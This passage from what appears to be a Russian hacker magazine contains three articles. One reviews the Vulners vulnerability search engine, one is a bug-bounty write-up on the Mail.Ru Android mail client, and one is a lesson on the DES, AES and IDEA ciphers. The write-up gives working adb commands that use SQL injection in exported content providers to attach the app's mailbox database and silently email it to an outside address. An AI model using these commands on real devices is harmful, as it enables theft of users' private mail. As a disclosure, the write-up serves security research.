 тента. Сайт позволяет искать уязвимости, эксплоиты, патчи, результаты bug
 bounty так же, как обычный поисковик ищет сайты. Vulners агрегирует и пред-
 ставляет в удобном виде шесть основных типов данных:
 •  Популярные базы уязвимостей. Они содержат общие описания уязвимо-
 стей и ссылки на источники. Например, известная CVЕ американского агент-
 ства MITRE и института NIST. Но, помимо информации из нее, в Vulners до-
 бавляются общие описания уязвимости и других исследовательских центров
 и центров реагирования: Vulnerability Lab, XSSed, CERT, ICS, Zero Day Initiative,
 Positive Technologies, ERPScan.
 •  Вендорские бюллетени безопасности. Это баг-репорты, которые пишут
   сами вендоры об уязвимостях в своих продуктах. Сейчас это разнообраз-
   ные дистрибутивы Linux (Red Hat CentOS, Oracle Linux, Arch Linux, Debian,
    Ubuntu, SUSE), FreeBSD, сетевые устройства (F5 Networks, Cisco, Huawei,
    Palo Alto Networks) и популярные и критичные программы (OpenSSL, Samba,
    nginx, Mozilla, Opera), в том числе и CMS (WordPress, Drupal).
 •  Эксплоиты из Exploit-DB и Metasploit. Они парсятся и сохраняются полно-
    стью, с исходниками (их можно сразу смотреть в удобном редакторе).
 •  Nessus-плагины для детекта уязвимостей. Легко посмотреть, можно ли найти
    ту или иную уязвимость при сканировании сети этим популярным сканером.
 •  ​Дисклозы багов с сайтов bug bounty программ. В Vulners поддерживаются
   записи с HackerOne.
 •  Публикации на тематических ресурсах. Собираются данные с Threatpost и
    rdot.org, где часто освещают темы, связанные с уязвимостями.

Все это обрабатывается, каталогизируется, структурируется и доступно для
 поиска в любой момент.





                       Вендоры, от которых собирается и анализируется инфа в Vulners

В отличие от других баз, которые описывают баги в специальном формализо-
 ванном виде (например, на языке OVAL-баз CIS или SecPod), Vulners хранит
 данные в формализованном виде и автоматически устанавливает связи между
 ними, быстро ищет и красиво отображает результаты поиска. Что с этим де-
 лать, целиком зависит от фантазии конечного пользователя.

Кто и на чем пишет Vulners?

 Vulners пилят на энтузиазме в свободное от основной работы время пять человек:
 •  Кирилл «isox» Ермаков пишет ядро и админит;
 •  Игорь «Videns» пишет поиск;
 •  Ваня «Ванкувер» пишет фронт;
 •  Саша «Plex» пишет роботов-сборщиков;
 •  Александр Леонов пишет статьи и аналитику.

 Первую версию Vulners выкатили уже через пару месяцев с начала разработки
 к конференции Black Hat USA 2015 в Лас-Вегасе. Сейчас проекту уже год.
   Весь движок Vulners написан на Python + Django, в качестве базы взята
MongoDB + Elasticsearch. MongoDB используется только для закладки дан-
 ных роботами — сборщиками информации, Elasticsearch только для фронтен-
 да. Деплой производится с Bitbucket’а скриптом. Масштабирование заложено
 прямо в ядре: MongoDB и Elasticsearch шардятся. Фабрика роботов написана
 хостонезависимой и может гоняться отдельно от всего проекта. Одна из кру-
 тых фишек — ребята уже полностью перешли на Python 3.5+ и asyncio в своем
 проекте. Так что поиск не всегда работает точно, но всегда очень быстро :).
   На текущий момент в базе Vulners 319 557 бюллетеней и 144 684 эксплои-
 та. А занимает все это в базе меньше 2 Гбайт. Такая компактность достигается
 за счет дедупликации и упаковывания. Все лежит в оперативной памяти, по-
 этому скорость поиска значительно увеличивается. Стоит упомянуть и то, что
 Vulners защищается WAF Wallarm, работающим в блокирующем режиме.





                                                              Архитектура Vulners



Но довольно слов, давай попробуем что-нибудь поискать.

ПРОБУЕМ ИСКАТЬ
 Первое, что видишь, когда заходишь на Vulners, — это, конечно же, строка
 поиска. Просто введи название приложения, сайта или CVE-код уязвимости,
 и Вульнерс выдаст тебе все последние публичные баги по этому продукту со
 ссылками на эксплоиты, плагины для детекта и различные публикации.





                         Типовая выдача Vulners по багам WordPress. Обрати внимание:
                       данные обновляются постоянно и в автоматическом режиме


 Естественно, простые запросы вроде «wordpress» или «xakep.ru» рассматри-
 вать скучно, с этим ты и сам разберешься. Давай посмотрим, что интересного
 умеет Vulners.

Задача: найти критичные баги CentOS со ссылками на сплоиты
 Запрос: type:centos order:published
    Vulners позволяет фильтровать результаты поиска и/или сортировать их по
любому полю баги:
 •  по типу бюллетеня;
 •  по CVSS Score;
 •  по дате;
 •  по номеру плагина детекта;
 •  по имени ресерчера.

И так далее. Искать и сортировать можно абсолютно по любому полю.
   Благодаря  этому мы можем  сформировать  сложный  запрос  типа
 type:centos cvss.score:[8 TO 10] order:published, что означает «най-
 ди мне все новые баги CentOS, где CVSS Score от 8 до 10, то есть критичный».
 Поскольку Вульнерс автоматически связывает с багой все собранные данные,
 на странице CVE ты увидишь доступные патчи и эксплоиты.
   Также результаты выполнения этого запроса можно получать при помо-
щи API — это пригодится тебе в автоматизированных сканерах. Для это-
 го  достаточно  сделать  GET-запрос  на  https://vulners.com/api/v3/
search/lucene/?query=type:centos%20cvss.score:[8%20TO%2010]%20
 order:published. В ответ придет отформатированный машиночитаемый JSON.
   Еще один полезный параметр API-запросов — references=true, который
 позволяет получить в результатах запроса не только объекты безопасности,
 но и все их связи (плагины детекта, эксплоиты и прочее). Например, запрос
 https://vulners.com/api/v3/search/lucene/?references=True&query=t
 ype:centos%20cvss.score:[8%20TO%2010]%20order:published — выведет
еще и все references, связные элементы из базы.





                                                     Графическое задание запроса

Получаем больше двадцати записей от Vulners

 По умолчанию Vulners отдает только первые двадцать записей запроса. Если
 хочется больше, нужно задать параметр size. Так можно получить до 10 000. А
 если и этого мало, то можно запрашивать несколько раз по 10 000, пропуская
 уже полученные результаты при помощи параметра skip.



Задача: обосновать IT-департаменту, зачем нужен патч-менед-
жмент (или просто найти все сплоиты по определенной баге :))
 Запрос: cvelist:CVE-2014-0160 type:exploitdb
   При помощи Vulners сравнительно просто обосновать IT-департаменту, по-
 чему уязвимости, обнаруженные сканером, действительно опасны и их стоит
 патчить. Для этого можно показать список эксплоитов, найденных по номеру
CVE или другому идентификатору. Доступен поиск по Exploit-DB или Metasploit.
На одной странице будет и описание, и исходники эксплоита, по которым так-
же можно искать.





                                        Ищем сплоиты по CVE-2014-0160


 Как видим, на странице эксплоита приводится его полный текст. По этому тек-
 сту также можно искать.





                                   Эксплоит можно просмотреть в удобной превьюшке

Задача: узнать, сколько денег и на каких bug bounty заработал
определенный хакер
 Запрос: isox order:bounty
   Уникальная фича Vulners — поиск по баг-баунти. Можно найти, какие уязви-
 мости софта зарепортил исследователь, и посмотреть его достижения в bug
 bounty программах. Результаты можно сортировать по командам, исследова-
 телям, цене и прочему.
   Например, ищем по нику, сортируем по размеру вознаграждения за
 баг-баунти:





                                                    Пример поиска по bounty





        Вульнерс нашел зарепорченную багу в Mail.Ru, за которую заплатили 400 долларов

А если уточнить в запросе reporter, можно считать чужие деньги, что стыдно, но
 любопытно.

 $ curl "https://vulners.com/api/v3/search/lucene/?query=type%3A
 hackerone+order%3Alastseen+reporter%3Aisox" 2>/dev/null | awk
 '{if($0~"\"bounty\""){gsub(",","",$2)}; earn+=$2 }END{print earn}'

 Ответ (в долларах):

 2640

 Также можно искать примеры реальных SQL-инъекций или уязвимостей, которые
 находили на конкретном сервисе, например на Vimeo: type:hackerone Vimeo.





                       Ищем зарепорченные на HackerOne баги по сервису Vimeo

Задача: найти баги по плагинам Nessus
 Запрос: type:nessus order:published
   Поиск по плагинам Nessus — также уникальная фича Vulners. Так, запрос
выше выведет список последних добавленных плагинов.





                                                    Пример поиска по Nessus





                                            Найденная уязвимость с GNU C Library

Еще одна крутая особенность Vulners — возможность искать по уязвимостям
 более чем 13 000 топовых Android-приложений из Google Play! Store US че-
 рез базу HackApp. Для поиска нужно указать тип type:hackapp. Подробнее об
 этой фиче читай в рубрике Easy Hack в этом же номере ][.

РАБОТА С API
На момент написания статьи публично доступен только поисковый API. В JSON
 передается запрос и количество результатов (size), которое хочется получить.
 Максимальный размер выдачи — 10 000 записей. Хватит, чтобы утащить все
 бюллетени CentOS сразу. А чтобы забрать что-то совсем большое, за несколь-
 ко раз, можно задать смещение с помощью параметра skip.
   Поскольку Vulners использует Elasticsearch, любой запрос обрабатывается
 Apache Lucene. А это значит, что запросы к Vulners строятся точно так же, как к
 Lucene. Имена полей для поиска можно узнать в помощнике API. Любой ключ
 «схемы» для каждого типа коллектора можно использовать в качестве «ключа»
 в запросе Lucene, например:
 •  title
 •  description
 •  affectedPackage
 •  sourceData
 •  cvelist

Пример запроса по API, который вернет данные по CVE-2014-0160:

 curl https://vulners.com/api/v3/search/lucene/?query=type:cve%20
    id:CVE-2014-0160

 Ответы также в JSON:





БОТ ДЛЯ TELEGRAM С ПОДПИСКАМИ НА РЕЗУЛЬТАТЫ ЗАПРОСА
В апреле Vulners запустили бота для мессенджера Telegram:





 Бот позволяет делать запросы, так же как на сайте.
   Но главное — с его помощью можно создавать настраиваемые подписки
 на security content.
   Пользоваться просто. Отправь боту сообщение /subscribe и свой поиско-
 вый запрос и получай новые результаты поиска, как только они будут появлять-
 ся на Vulners.





 Этот сервис может помочь безопасникам оставаться в курсе публикации но-
 вых уязвимостей. Ребята из эксплуатации могут подписаться на рассылки по
 программному обеспечению, которое используют. Пентестеры — оперативно
 получать информацию об эксплуатации уязвимостей на практике.
   Хочешь просмотреть свежие публикации CVE? Нет проблем:

 /subscribe type:cve

 Хочешь видеть апдейты по эксплоитам?

 /subscribe bulletinFamily:exploit

 Твои серверы работают под Debian? Следи за их безопасностью!

 /subscribe type:debian

А у Vulners есть альтернативы?

Vulners — не единственный агрегатор уязвимостей. Есть, к примеру, базы
Secunia и OSVDB, но одна закрылась 5 апреля, а другая платная.
  Еще существует отечественный БнД УБИ ФСТЭК, но они хранят только опи-
сания самих уязвимостей и больше ничего (нет данных об эксплоитах), да и те,
честно говоря, формализованы не очень. К тому же «Банк данных угроз безо-
пасности информации» не предоставляет открытого API, то есть использовать
его в автоматизированных сканерах не получится


ВЫВОДЫ
 Vulners — уникальный и незаменимый помощник любому хакеру и безопасни-
 ку. Он очень сильно экономит время при исследовании и эксплуатации слож-
 ных векторов атак. Конечно, инструмент только развивается, но уже сейчас он
 вполне юзабелен. А что еще более важно, Vulners открытый и бесплатный для
 конечного пользователя и всегда будет таким.
    Кстати, уязвимости, найденные на  vulners.com, можно сабмитить на
 https://hackerone.com/vulnerscom. Искать можно все что угодно. Так как
 проект бесплатный, то и финансирования для выплаты вознаграждений нет, но
 public disclosure разработчики гарантируют. Email для связи support@vulners.
 com, прочие контактные данные здесь. Удачи!
ВЗЛОМ


ИНЖЕКТ
ДЛЯ РОБОТА

ВСКРЫВАЕМ ПОЧТОВОЕ ПРИЛОЖЕНИЕ
ОТ MAIL.RU ДЛЯ ANDROID





                                      Михаил Фирстов
                                                  @cyberpunkych,
                                                  cyber-punk@xakep.ru

Случайным образом, копая очередной BugBounty, я на-
толкнулся на цепочку уязвимостей в достаточно популяр-
ном почтовом клиенте от IT-гиганта Mail.Ru. Эксплуатация
уязвимостей из этой цепочки не требовала на устройстве
особых прав и могла привести к полной компрометации
содержимого почтового ящика жертвы или даже содер-
жимого SD-карты. В статье я опишу методы, с помощью
которых были найдены эти уязвимости, вспомогательные
тулзы и финальный вектор с демонстрацией на видео.

ПОЕХАЛИ!
Первым делом понадобится, конечно, девайс (или эмулятор), Android SDK
tools, нужный нам APK, drozer и набор мелких утилит для декомпиляции и раз-
бора Java-кода. Но обо всем по порядку.
  Первым делом инсталлируем SDK Tools и настраиваем девайс/эмулятор. Я
буду рассматривать реальный девайс, но только потому, что мне так удобнее,
и вообще — комп с запущенным эмулятором греется! Права рута на устрой-
стве сильно облегчают тебе жизнь, но для нахождения и эксплуатации многих
уязвимостей они не требуются.
   После настройки SDK Tools скачиваем и устанавливаем drozer из офици-
ального репозитория, ставим APK-клиент на устройство. Отлично, связанные
с девайсом приготовления закончены, чтобы проверить работоспособность —
подключаемся, пробросив порт (это делать необязательно, если используется
реальный девайс из твоей сети, а не эмулятор):

$ adb forward tcp:31415 tcp:31415
$ drozer console connect 127.0.0.1

Ну и конечно же, ставим на устройство само приложение почты Mail.Ru, кото-
рое будем ломать. Распаковываем и декомпилируем аппликуху при помощи
утилиты dex2jar. Для просмотра и поиска по исходникам я советую использо-
вать JD-GUI, ну или можешь взять любой другой редактор кода на твой вкус.
Все готово, начинаем ресерч.





                              Вот так выглядит успешно запущенная консоль drozer’а


ИЩЕМ ВЕКТОР АТАКИ
Теперь дело за малым — найти уязвимости, продумать
вектор и написать эксплоит. Начинаем со сканирования
приложения: ищем то, за что можно будет зацепиться. Де-
лается это при помощи drozer’а следующим образом:

                                                         INFO
dz> run app.package.attacksurface ru.mailru.app
could not find the package: ru.mailru.app                        Если хочешь
                                                                               попробоватьdz> run app.package.attacksurface ru.mail.mailapp                                                                              самостоятельно
Attack Surface:                                                                               провернуть все
  26 activities exported                                         описанные действия
  10 broadcast receivers exported                               в исследовательских
                                                                                   целях, выкладываю  2 content providers exported                                                                             для тебя именно
  14 services exported                                                        ту версию APK-
                                                                        шника Mail.Ru,
                                                                              с которой я проводилКак видишь, у приложения довольно много экспортиро-                                                                              эксперименты.
ванных контент-провайдеров, с них я и предлагаю начать                                                                                   Качай, пробуй,
поиски. Команда run app.provider.info -a ru.mail.       репорти баги! :)
mailapp выведет нам список из двух провайдеров:

ru.mail.mailbox.contacts
ru.mail.mailapp.images.cache

Кстати, можно оставить автоматическое сканирование провайдера drozer’у
при помощи команды

dz> run scanner.provider.injection -a ru.mail.mailapp

Но я предпочитаю искать уязвимости руками, поэтому просто пробуем вызы-
вать данный контент-провайдер непосредственно через adb при помощи ко-
манды am start, выполненной на устройстве. Повторюсь, так как контент-про-
вайдер экспортирован, права root нам необязательны.

$ adb shell am start -d "content://ru.mail.mailapp.images.cache/
image_parameters/0\'"
Starting: Intent { dat=content://ru.mail.mailapp.images.cache/
image_parameters/0' }

Как можно увидеть, пользователю предложат выбрать, что же делать с данным
URL, какой из Activity запускать. Чтобы избежать подобных вопросов, допол-
няем команду am параметром -n и указываем нужный нам активити, например
ru.mail.mailapp/ru.mail.ui.writemail.SharingActivity.  Приложение
тут же завершится с ошибкой, а мы топаем в logcat, чтобы узнать, в чем про-
блема.





                             Подставляем кавычку, получаем ошибку SQL. Классика!


А проблема в том, что это типичная union-based SQL injection, которую можно
классическим образом раскрутить и получить вывод (как на экран телефона,
так и в системный лог):

$ adb shell am start -d "content://ru.mail.mailapp.images.cache/
image_parameters/0\)\ union\ select\ 1,2,3,sqlite_version\(\),5,6,
7,8--\ /" -n ru.mail.mailapp/ru.mail.ui.writemail.SharingActivity
...
Starting: Intent { dat=content://ru.mail.mailapp.images.cache/
image_parameters/0) union select 1,2,3,sqlite_version(),5,6,7,8--
 / cmp=ru.mail.mailapp/ru.mail.ui.writemail.SharingActivity }
$ adb logcat
...
E/BitmapFactory(15311): Unable to decode stream: java.io.FileNotFound
Exception: /3.8.6: open failed: ENOENT (No such file or directory)

Как оказалось, SQL-инъекции подвержен не только первый контент-провай-
дер, но еще и второй, доступный сторонним приложениям. Под него можно
использовать следующий вектор:

$ adb shell am start -d "content://ru.mail.mailbox.contacts/account/
\'\)\ union\ select\ 1,2,3,4,3,6,7,8,9,10+" -n ru.mail.mailapp/
ru.mail.ui.writemail.SharingActivity

Чтобы понять, почему это происходит, предлагаю обратиться непосред-
ственно к исходному коду декомпилированного приложения. Ответ кроет-
ся в файле, расположенном по адресу ru/mail/mailbox/content/contact/
ContactsProvider.java.  Как  видишь,  результат  выполнения  функции
getContactAccount() попадает сразу в SQL-запрос, не проходя никаких прове-
рок, — это и позволяет злоумышленнику проводить инъекцию.





                      Выполняем union-based-инъекцию и получаем вывод в ошибке

РАСКРУЧИВАЕМ ИНЖЕКТ
Но этого мне было мало, я хотел получить полный доступ к файлам приложе-
ния (среди прочего и к файлу mailbox_db), расположенным в системной папке
в /data/data/ru.mail.mailapp/databases/, где приложение хранит основ-
ную информацию, в том числе содержимое писем. Как можно было заметить
ранее, содержимое одной из колонок отвечает за путь до прикладываемого
к письму файла. Так как к файлу обращается само приложение, мы можем ука-
зать доступные именно приложению «Почта Mail.Ru» файлы, например /data/
data/ru.mail.mailapp/databases/mailbox_db.
   Тогда выбранный вектор примет, например, следующий вид:

$ adb shell am start -d "content://ru.mail.mailbox.contacts/
account/\'\)\ union\ select\ 111,\'%2fdata%2fdata%2fru.mail.
mailapp%2fdatabases%2fmailbox_db\',333,444,555,666,777,888,99,
100500--+" -n ru.mail.mailapp/ru.mail.ui.writemail.SharingActivity

Судя по тому, что файл приаттачил-
ся и ниже указан его реальный раз-
мер, можно сделать вывод, что вектор
успешно сработал и мы «подгрузили»
в письмо интересующий нас объект.
Все бы ничего, но все равно нужно,
чтобы пользователь отправил данное
письмо с приложенным файлом...
   Так  как  нам  доступны  некото-
рые  экспортированные  activity,  сре-
ди  них  можно  обнаружить  следу-
ющий —   ru.mail.ui.writemail.
MailToMySelfActivity,  который  от-
вечает за автоматическую отправку пи-
сем «себе». Используем его в конеч-
ном векторе атаки, чтобы письмо сразу
отправлялось без какого-либо участия
со стороны пользователя. Добавляем
к нему предыдущий вектор и в качестве
extras указываем нашу почту и другие
данные для отправки. Эти параметры,
кстати, можно тоже нехитрым образом
отыскать в исходном коде (буквально
грепая по сорцам). Но я их как-то до-
вольно быстро угадал и без подсказок.
   Конечный  вектор  атаки  выглядит    Приложение после инъекции, можно
следующим образом:                        увидеть, какая колонка за что отвечает


$ adb shell am start -W -a android.intent.action.SEND -e
android.support.v4.app.EXTRA_CALLING_PACKAGE "ru.mail.mailapp"
--ecn android.support.v4.app.EXTRA_CALLING_ACTIVITY "ru.mail.mailapp/
ru.mail.ui.writemail.MailToMySelfActivity" -d "content://ru.mail.
mailbox.contacts/account/\'\)\ union\ select\ 1,\'%2fdata%2fdata%2f
ru.mail.mailapp%2fdatabases%2fmailbox_db\',3,4,5,6,7,8,9,2--+" -e
 android.intent.extra.TEXT "pew-pew" -e android.intent.extra.SUBJECT
 "PWND" --esa android.intent.extra.EMAIL "cyber-punk@xakep.ru" -n
 ru.mail.mailapp/ru.mail.ui.writemail.MailToMySelfActivity

где EMAIL — наш почтовый ящик, на ко-
торый придет письмо с указанным фай-
лом (в данном случае это файл /data/
data/ru.mail.mailapp/databases/
mailbox_db).
   Что же произойдет после запуска
данной команды? Приложение запу-
стится, через SQL injection вектор под-
грузит  указанный файл и  выполнит
отправку письма «самому себе», не иг-
норируя при этом наши передаваемые
extras. Демонстрацию работы эксплои-
та можно посмотреть на видео.

ИТОГ
Таким образом, мы, используя опи-
санную технику, можем без root-прав
не только выполнять SQL-запросы к не-
которым доступным таблицам, но и по-
лучать и сливать все файлы, доступные
приложению. Повторюсь, что для это-
го вектора не нужны никакие действия
на самом телефоне. Также стоит отме-
тить, что использовать эту атаку сможет
любое стороннее приложение,  уста-
новленное на устройстве. Специально                                           Указываем в качестве значения колон-
для проведения подобного рода атак    ки адрес файла с БД писем
на черном рынке существует услуга
«инсталлов» твоего вредоносного при-
ложения на большое количество устройств ни о чем не подозревающих поль-
зователей.
   Естественно, я сообщил обо всех уязвимостях в BugBounty Mail.Ru, но,
к сожалению, вознаграждения не получил, а официальный ответ был такой:

       "Few mistakenly exported Content providers and  activities are
       reported to have vulnerabilities, allowing application data access
      and manipulation. This report was marked as a duplicate due to
      known fact activities and content providers are exported by mistake
           (fix is under development)."

Почему статус репорта изменился на None Applicable, хоть уязвимости и при-
сутствовали в официальном приложении на момент репорта? Я не знаю,
но продолжать искать уязвимости в продуктах и сервисах Mail.Ru мне теперь
не особо хочется. Надеюсь, что другие в этом преуспеют лучше меня, в любом
случае — удачи! :)
ВЗЛОМ
ПОГРУЖЕНИЕ
В КРИПТУ. ЧАСТЬ 4:
СОВРЕМЕННЫЕ
ЗАРУБЕЖНЫЕ
                         ЧТО ТАКОЕ,
                            КАК РАБОТАЮТ
                       И В ЧЕМ РАЗНИЦА
                       МЕЖДУ 3DES, AES,ШИФРЫ
                            BLOWFISH, IDEA
                       И THREEFISH
                         ОТ БРЮСА ШНАЙЕРА



                             Анастасия Береснева
                                 anastasiya3161@gmail.com





В прошлый раз ты познакомился с великими и ужасны-
ми отечественными шифрами. Это был очень непростой
урок, ведь эти криптосистемы стоят на страже государ-
ственной тайны. Скажешь, куда уж замудреннее? А вот
сюда, пожалуйста! На самом деле не стоит пугаться,
в этот раз не будем так глубоко погружаться в математику
и рассматривать режимы шифрования — их принципы ты
уже усвоил (ну или не усвоил). Пройдемся по самым топо-
вым зарубежным шифрам и посмотрим, как же их приме-
няют на практике.


Roadmap

Это четвертый урок из цикла «Погружение в крипту». Все уроки цикла в хроно-
логическом порядке:

• Урок 1. Исторические шифры: основы, исторические шифраторы, как ра-
   ботают (и анализируются) шифры сдвига, замены, Рихарда Зорге, шифр
   Вернама и шифровальные машины
• Урок 2. Распределение ключей: что это такое, как выполняется распреде-
   ление ключей и как выбрать криптостойкий ключ
• Урок 3. Современные отечественные шифры: что такое сеть Фейстеля, ка-
   кими бывают отечественные блочные шифры, используемые в современных
   протоколах, — ГОСТ 28147—89, «Кузнечик»
• Урок 4. Современные зарубежные шифры: что такое, как работают и в чем
   разница между 3DES, AES, Blowfish, IDEA, Threefish от Брюса Шнайера (ты
   здесь)
• Урок 5. Электронная подпись: виды ЭП, как они работают и как их исполь-
   зовать
• Урок 6. Квантовая криптография: что это такое, где используется и как по-
   могает в распределении секретных ключей, генерации случайных чисел
   и электронной подписи



Чтобы не сесть в лужу с терминами, рекомендую освежить в памяти понятия
поточных и блочных шифров, а также симметричного и асимметричного шиф-
рования, блоков замены и сети Фейстеля.

3DES
Итак, первым в ряду зарубежных шифров рассмотрим 3DES, а точнее его
ближайшего родственника DES (Data Encryption Standard), который хоть уже
и не используется как таковой, но является предком 3DES.
  DES разработан командой математиков научной лаборатории IBM, в кото-
рую входил уже знакомый нам Фейстель. Первая версия шифра получила имя
«Люцифер», но затем он был модифицирован и в результате принят как офи-
циальный алгоритм шифрования данных (DEA). На протяжении более двадца-
ти лет он оставался мировым стандартом, прежде чем его сменил Triple DES.
   Рассмотрим, как работает алгоритм шифрования DES. Для этого необхо-
димо вспомнить работу сети Фейстеля. DES — это сеть Фейстеля из 16 раун-
дов с симметричными ключами шифрования. Длина блока текста — 64 бита,
длина раундового ключа — 48 бит. Итак, пройдем основные этапы шифрова-
ния DES, опуская суровую математическую сторону:
1. Текст, как и при любом другом шифровании, разбивается на блоки по 64
   бита.
2. Из 56-битного ключа генерируется 16 48-битных раундовых ключиков.
3. Каждый блок подвергается перестановке, то есть все биты входного блока
   перемешиваются согласно определенной таблице.
4. Блок расщепляется на половинки и поступает в знакомую нам сеть Фейсте-
    ля, где прокручивается 16 раундов.
5. Соединяем половинки.
6. И еще одна перестановка.





Начальная и конечная перестановки не имеют никакого значения для крипто-
графии в DES. Обе перестановки — без ключей, и таблицы для них заданы за-
ранее. Причина, по которой они включены в DES, неясна, и проектировщики
DES об этом ничего не сказали. Можно предположить, что алгоритм планиро-
валось реализовать в аппаратных средствах (на чипах) и что эти две сложные
перестановки должны были затруднить программное моделирование меха-
низма шифрования.
   Вот, собственно, все, что надо знать о работе алгоритма DES. Если углу-
бляться в то, как работает функция, заданная в сети Фейстеля, то в ней все
прекрасно. Она осуществляет и перестановку, и замену (S-боксы, как ты мо-
жешь помнить из предыдущей статьи), и сложение с раундовым ключом.
  Но вернемся к тройному DES, или Triple DES. В нем возникла необходи-
мость, так как 56-битный ключ DES был уязвим к брутфорсу и с ростом вычис-
лительных мощностей эта проблема вставала все острее. Используя доступ-
ную сегодня технологию, можно проверить один миллион ключей в секунду.
Это означает, что потребуется более чем две тысячи лет, чтобы перебором
дешифровать DES, используя компьютер только с одним процессором.
  Но если взять компьютер с одним миллионом процессорных ядер, которые
будут параллельно обрабатывать ключи, мы сможем проверить все множество
ключей приблизительно за 20 часов. Когда был введен DES, стоимость тако-
го компьютера равнялась нескольким миллионам долларов, но она быстро
снизилась. Специальный компьютер был создан в 1998 году — и нашел ключ
за 112 часов.
   Чтобы решить проблему быстрого поиска ключа, умные зарубежные
криптографы предложили использовать два ключа и применять DES дважды.
Однако двойной DES оказался уязвим к атаке «встреча посередине». Чтобы
реализовать эту атаку, злоумышленнику необходимо иметь открытый и соот-
ветствующий ему зашифрованный текст. Злоумышленник шифрует открытый
текст на всех возможных ключах, записывая результаты в таблицу 1. Затем
расшифровывает зашифрованный текст со всеми возможными ключами и за-
писывает результат в таблицу 2. Далее злоумышленник ищет в таблицах 1 и 2
совпадения. Атака данного типа заключается в переборе ключей на стороне
шифрованного и открытого текста и требует примерно в четыре раза боль-
ше вычислений, чем перебор обычного ключа DES, и довольно много памя-
ти для хранения промежуточных результатов. Тем не менее на практике атака
осуществима, что делает алгоритм Double DES непригодным.
   Совсем иначе дела обстоят с Triple DES. Использование трех ключей и при-
менение алгоритмов в указанной на схеме последовательности продлило DES
жизнь еще на несколько лет.





Замечательный DES
Так что же в DES такого замечательного? Этот алгоритм шифрования был под-
вергнут тщательному анализу. DES обладал двумя очень важными качествами
блочных шифров — лавинностью и полнотой. Настало время расширить свой
криптографический словарик!


Лавинный эффект означает, что небольшие изменения в исходном тексте (или
 ключе) могут вызвать значительные изменения в зашифрованном тексте.
Было доказано, что DES имеет все признаки этого свойства.

     Исходный текст       0000000000000000     0000000000000001
         Ключ           22234512987ABB23     22234512987ABB23
  Зашифрованный текст    4789FD476E82A5F1    OA4ED5C15A63FEA3

 Хотя два блока исходного текста не совпадают только самым правым битом,
блоки зашифрованного текста отличаются на 29 бит. Это означает, что изме-
нение приблизительно в 1,5% исходного текста вызывает изменение прибли-
 зительно 45% зашифрованного текста.
   Эффект полноты заключается в том, что каждый бит зашифрованного тек-
 ста должен зависеть от многих битов исходного текста. Как мы уже выяснили,
 в DES применяются и перестановки, и замены — все преобразования устанав-
ливают зависимость каждого бита шифротекста от нескольких битов исходно-
 го текста.



Где же применяется DES? Да почти везде, его реализации присутствуют
в большинстве программных библиотек. Однако кто знает, насколько исполь-
зование DES безопасно в наше время? Хотя IBM утверждала, что работа ал-
горитма была результатом 17 человеко-лет интенсивного криптоанализа, не-
которые люди опасались, не вставило ли NSA в алгоритм лазейку, которая
позволяет агентству легко дешифровывать перехваченные сообщения. Ко-
митет по разведке сената США тщательно изучал этот вопрос и, разумеется,
ничего не обнаружил, обвинения с NSA были сняты, результаты исследования
тем не менее засекречены. Одним словом, в Америке еще долго крутились
слухи и домыслы насчет того, стоит доверять DES или нет. Но, как я считаю,
здесь ситуация описывается поговоркой «Умный не скажет, дурак не поймет».
В конце концов NSA признало, что не могло доверить IBM столь важную мис-
сию и внесло несколько корректировок вроде задания S-боксов.
   Все время существования DES он был мишенью для различных мето-
дов криптоанализа. Криптоаналитики не переставали мериться машинами
для вскрытия DES — за какое время кто сможет дешифровать текст. В связи
с этим появилось несчетное количество различных модификаций этого алго-
ритма, и 3DES далеко не самая изощренная из них.

AES
Победитель конкурса AES, объявленный в конце 1997 года, алгоритм Rijndael
был разработан двумя бельгийскими криптографами — Йоаном Даменом
(Joan Daemen) и Винсентом Рейменом (VincentRijmen).
   Для обеспечения криптостойкости алгоритм Rijndael включает в себя по-
вторяющиеся раунды, каждый из которых состоит из замен, перестановок
и прибавления ключа. Однако, в отличие от DES, шифрование и расшифрова-
ние в этом алгоритме — процедуры разные.
   AES оперирует 128-битными блоками данных и ключами по 128, 192 и 256
бит. Концептуально он отличается от DES, так как не базируется на сети Фей-
стеля, а представляет собой подстановочно-перестановочную сеть (SP-сеть),
которую мы сейчас рассмотрим подробнее.
  В AES байты открытого текста не делятся на две части, как в сети Фейстеля,
а записываются в форму — матрицу (двумерный массив) байтов, расположен-
ных таким образом:

      0            4            8           12           16
      1            5            9           13                       ...
      2            6           10           14
      3            7           11           15

AES действует следующими операциями:
1. ExpandKey — вычисление раундовых ключей для всех раундов.
2. SubBytes — замена битов по таблице замены (S-боксу).
3. ShiftRows — циклический сдвиг строк в форме на различные величины.
4. MixColumns — смешивание данных внутри каждого столбца формы.
5. AddRoundKey — сложение ключа раунда с формой.





Сегодня AES является официальным стандартом правительства США для сим-
метричного шифрования и применяется повсеместно. Фактически это один
из самых универсальных зарубежных шифров на данный момент. Что каса-
ется безопасности AES, то и у него, как и большинства шифров, есть некото-
рые уязвимости, и криптоаналитики продолжают их искать. Однако, несмотря
на это, AES живее всех живых.

IDEA
IDEA (International Data Encryption Algorithm) — алгоритм блочного симметрич-
ного шифрования, который был предложен на замену стандарта DES. Началь-
ная версия алгоритма IDEA появилась в 1990 году. Алгоритм запатентован
в США и в большинстве европейских стран. Владеет патентом Ascom Tech,
но в некоммерческих целях алгоритм можно использовать бесплатно.
   Размер блока в этом шифре — 64 бита, длина ключа — 128. Стоит сразу
сказать, что алгоритм IDEA — самый молодой из перечисленных и его матема-
тика очень сложна. Минутка криптографического словарика.



Конфузия — шифрование должно зависеть от ключа сложным и запутанным
способом.
Диффузия — каждый бит незашифрованного текста должен влиять на каждый
бит зашифрованного текста. Распространение одного незашифрованного
бита на большое количество зашифрованных битов скрывает статистическую
структуру незашифрованного текста.



  В IDEA эти свойства достигаются за счет применения независимых мате-
матических операций. В отличие от DES, главной операцией которого являет-
ся XOR (сложение по модулю 2), IDEA предусматривает наличие:
•  XOR;
•  сложения по модулю 216;
•  умножения по модулю (216 + 1).

Комбинирование этих трех операций обеспечивает комплексное преобразо-
вание входных данных, затрудняя криптоанализ IDEA по сравнению с DES.
  В шифре IDEA выполняется восемь раундов, и в каждом раунде блок откры-
того текста подвергается преобразованию посредством математических опе-
раций. Любители «зреть в корень» могут позреть на схему одного раунда шиф-
ра IDEA, приведенную ниже. Блок текста, длиной 64 бита, делится на подблоки
по 16 бит. Каждый такой полученный блочок поступает на вход раунда и под-
вергается сложному преобразованию.





Неповторимая IDEA
«Мне кажется, это самый лучший и надежный блочный алгоритм, опубликован-
ный до настоящего времени», — говорит Брюс Шнайер об алгоритме IDEA.
